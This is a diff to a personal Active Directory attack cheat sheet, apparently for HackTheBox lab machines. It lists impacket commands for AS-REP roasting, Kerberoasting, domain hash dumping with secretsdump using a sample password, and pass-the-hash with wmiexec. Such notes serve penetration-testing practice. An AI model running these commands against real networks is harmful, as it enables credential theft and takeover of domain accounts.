@@ -1,9 +1,13 @@
+#Before starting kerberos or ldap attack
+ntpdate active.htb
+
 #ASREPRoast: check for users having UF_DONT_REQUIRE_PREAUTH set (Doesn't require auth)
-python /opt/impacket/examples/GetNPUsers.py htb.local/
+python /opt/impacket/examples/GetNPUsers.py htb.local/ #don't forget the / at the end
 python /opt/impacket/examples/GetNPUsers.py htb.local/ -usersfile usernames.txt
 
 #Kerberoasting: check users SPN (Require Auth)
-python opt/impacket/examples/GetUserSPNs.py active.local/svc_user -dc-ip 10.10.10.100
+python /opt/impacket/examples/GetUserSPNs.py active.local/svc_user -dc-ip 10.10.10.100
+python /opt/impacket/examples/GetUserSPNs.py active.local/svc_user -dc-ip 10.10.10.100 -request
 
 #GetADUsers
 GetADUsers.py -all -dc-ip 10.10.10.161 htb.local/svc-alfresco
@@ -35,3 +39,5 @@ python secretsdump.py htb.local/john:abcd1234@10.10.10.161 -just-dc
 and PassTheHash
 wmiexec.py -hashes :32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
 
+#Bloundhound
+Check bloodhound.txt
